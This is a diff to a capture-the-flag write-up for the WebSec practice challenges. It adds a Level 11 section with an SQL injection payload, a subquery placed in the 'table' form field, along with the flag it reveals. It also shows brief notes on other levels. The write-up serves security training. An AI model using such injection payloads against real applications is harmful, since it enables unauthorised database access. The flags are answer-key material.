@@ -84,6 +84,18 @@ while True:
 WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}
 ```
 
+## Level 11
+
+SQL Aliases without `as` keyword
+
+```
+user_id=2&table=(select 2 id, enemy username from costume)&submit=Submit+Query
+```
+
+```
+WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}
+```
+
 ## Level 15
 
 create_function() uses eval
